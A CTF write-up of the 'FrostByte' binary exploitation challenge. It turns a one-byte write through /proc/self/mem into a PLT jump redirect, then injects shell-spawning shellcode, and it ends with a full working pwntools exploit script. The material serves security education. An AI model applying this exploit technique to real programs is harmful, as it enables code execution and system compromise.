---
author: milrn
categories:
- Advent of CTF
- CyberStudents
- Binary Exploitation
- Hard
layout: post
media_subpath: /assets/posts/2026-02-16-frostbyte
tags:
- Advent of CTF 2025
- PLT
- Write Primitive
- Shellcode
- Hard
title: FrostByte
description: FrostByte was a Hard Binary Exploitation challenge from Advent of CTF 2025 (CyberStudents). It was the day 16 challenge.
---

FrostByte was a Hard Binary Exploitation challenge from Advent of CTF 2025 (CyberStudents). It was the day 16 challenge.

# Reversing

After putting the chall binary into ghidra, and disassembling main, I got the following code:

```
undefined8 main(void)

{
  size_t sVar1;
  long in_FS_OFFSET;
  undefined1 local_19;
  int local_18;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter filename: ");
  fgets(filename.0,0x100,stdin);
  sVar1 = strcspn(filename.0,"\n");
  filename.0[sVar1] = 0;
  printf("Enter offset: ");
  FUN_004011a0(&DAT_00402026,&local_18);
  getchar();
  printf("Enter data: ");
  read(0,&local_19,1);
  local_14 = open(filename.0,1);
  lseek(local_14,(long)local_18,0);
  write(local_14,&local_19,1);
  puts("Write complete.");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The binary seems to allow an arbitrary 1 byte write to any file, and our goal here is to somehow open a shell. To start with, I looked to see what memory protections this binary had:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   RW-RUNPATH   49 Symbols        No    0               3               chall
```

PIE is off, which means that the memory addresses of all the binary sections are not randomized.

# Arbitrary File

/proc/self/mem is a special file in Linux that allows a process to access its own memory directly. It can be used to read or write to the memory of the process, bypassing normal memory protection mechanisms. At this point, my goal was to simply get more than a 1 byte write, so I could inject shellcode into the process. So, using this special file, I just had to find a memory location to overwrite that would call the main function again, prompting for another one byte write.

# PLT Overwrite

After looking at the location of the filename.0 memory in ghidra, I confirmed that this is a unintialized global variable, which is stored in the .bss section. The .bss section is very close in memory to the GOT (Global Offset Table) section which is at a slightly lower address. The GOT section is responsible for dynamically holding the true libc address for libc functions. For example, when the puts() function is called inside a binary, it first calls the PLT (Procedure Linkage Table), which essentially checks to see if the true libc address of puts is resolved yet. If it is resolved, the PLT will jump to the libc address at the function's GOT entry; otherwise, if the function hasn't been called yet and the GOT entry has not be dynamically resolved, it prompts the linker to resolve it. This means that each PLT entry has a JMP instruction to the address of its associated GOT entry (points back to the PLT instructions to resolve itself if it hasn't been resolved). 

Now, how can this be exploited with a one byte write to call main?

Due to the very large buffer allocated to the filename (0x100), extra data can be written to this buffer, including the address of the main function. We can't directly put shellcode here because it is in the .bss section which is generally not executable memory. However, since the .bss section, where this variable is located, is so close to the GOT, the addresses in these locations only differ by *1 byte.* This means if there is a JMP instruction to a GOT entry, we can simply overwrite 1 byte and get an address that points to the .bss section where the filename.0 information is stored.

Ex.

```
puts@GOT at 0x404000
filename.0 at 004040a0

These differ by two hexadecimal nibbles (1 byte)
```
Lucky for us, the PLT has just that! Each PLT entry will JMP to the value stored at its GOT entry. We can simply overwrite the PLT entry JMP instruction with 1 byte that changes the address it grabs the value from to jump. It thinks it's jumping to an address stored at the GOT (true libc address), but it's actually going to jump to the pointer value stored in our filename.0 buffer.

Ex.

```
Dump of assembler code for function puts@plt:
   0x00000000004010f0 <+0>:     endbr64
   0x00000000004010f4 <+4>:     jmp    QWORD PTR [rip+0x2f06]        # 0x404000 <puts@got.plt>
   0x00000000004010fa <+10>:    nop    WORD PTR [rax+rax*1+0x0]

Changed to:

Dump of assembler code for function puts@plt:
   0x00000000004010f0 <+0>:     endbr64
   0x00000000004010f4 <+4>:     jmp    QWORD PTR [rip+0x2fa6]        # 0x4040a0 <filename.0>
   0x00000000004010fa <+10>:    nop    WORD PTR [rax+rax*1+0x0]

This will JMP to the pointer stored at 0x4040a0.
```

# Calling Main

We want to inject 1 byte so that it prompts us for a write and then calls main again, so we have another 1 byte write. It should keep doing this, so we have a full arbitrary write primitive. After providing the special /proc/self/mem file as our filename, we need to add a null byte to terminate the string. Then, we can write the address of main to the filename.0 buffer. This will be 15 bytes after the start of the filename.0 buffer (since the length of our actual file name + the null byte is 15 bytes).

To call the main address as explained in the previous section, we need to overwrite a PLT entry. The libc function that is called *after* the 1 byte write is puts() (identified by dissasembling the main function with GDB), so this is the function we should target for execution redirection.

```
   0x00000000004013c9 <+276>:   call   0x401100 <write@plt>
   0x00000000004013ce <+281>:   lea    rax,[rip+0xc61]        # 0x402036
   0x00000000004013d5 <+288>:   mov    rdi,rax
   0x00000000004013d8 <+291>:   call   0x4010f0 <puts@plt>
   0x00000000004013dd <+296>:   mov    eax,0x0
   0x00000000004013e2 <+301>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004013e6 <+305>:   sub    rdx,QWORD PTR fs:0x28
   0x00000000004013ef <+314>:   je     0x4013f6 <main+321>
   0x00000000004013f1 <+316>:   call   0x401110 <__stack_chk_fail@plt>
   0x00000000004013f6 <+321>:   leave
   0x00000000004013f7 <+322>:   ret
End of assembler dump.
```

The PLT entry of puts (found using Ghidra, unchanged because no PIE), is at 0x4010f4.

```
004010f4 ff 25 06        JMP        qword ptr [-><EXTERNAL>::puts]                   int puts(char * __s)
         2f 00 00
                     -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
```

The first two bytes at this address are instruction OPCODES for JMP (we won't mess with those); however, the two bytes after that are the offset from RIP that the program will jump too. Right now, that is the exact GOT entry for puts at 0x404000. We want to change this address to 0x4040a0 (filename.0) + 15 = 0x4040af. This can be done by adding 175 to the RIP offset, which changes the jump to an offset of 0x2fb5.

So, to achieve our redirection to main we just need to overwrite the third byte at this address from 0x06 to 0xb5. After this one byte write is done, we essentially have infinite writes!

# Shellcode

From here, it's very easy to achieve a shell. We can generate shellcode that spawns a shell using pwntools (`asm(shellcraft.sh())`) and then write it after our call to puts() one byte at a time. When we are done writing all the shellcode, we can simply replace our overwritten byte back to 0x06, which stops our redirections, and therefore calls the shellcode stored directly after it.

Final Exploit:

```
from pwn import *
elf = context.binary = ELF('chall')
context.log_level = 'debug'
p = process(elf.path)
shellcode = asm(shellcraft.sh())
p.sendlineafter(b":", b"/proc/self/mem\x00" + p64(elf.symbols["main"]))
# writing main function address to filename.0
p.sendlineafter(b":", str(0x4010f6))
# location of PLT byte we want to overwrite (0x4010f4 + 2)
p.sendafter(b":", b"\xb5") # send instead of sendline because the read() function is being called with 1 byte which doesn't consume the newline that sendline causes; this will cause issues later down the line if send() isn't used
# overwriting PLT byte so it points to location of main address in filename.0
location = elf.symbols["main"]+301
# a location after the puts@plt call
for byte in shellcode:
	p.sendlineafter(b":", b"/proc/self/mem\x00" + p64(elf.symbols["main"]))
	p.sendlineafter(b":", str(location))
	# write shellcode byte to a location after the puts@plt call
	p.sendafter(b":", bytes([byte]))
	location += 1
	# increment location by one byte to write the next shellcode byte
p.sendlineafter(b":", b"/proc/self/mem\x00" + p64(elf.symbols["main"]))
p.sendlineafter(b":", str(0x4010f6))
p.sendafter(b":", b"\x06")
p.interactive()
# remove overwrite to stop redirecting executions back to main which will subsequently execute our built up shellcode
# NOTE: the use of the `after` functions in pwntools is to increase the reliability of the exploit
```

After executing this pwntools script, we successfully obtain a shell, completing the challenge!
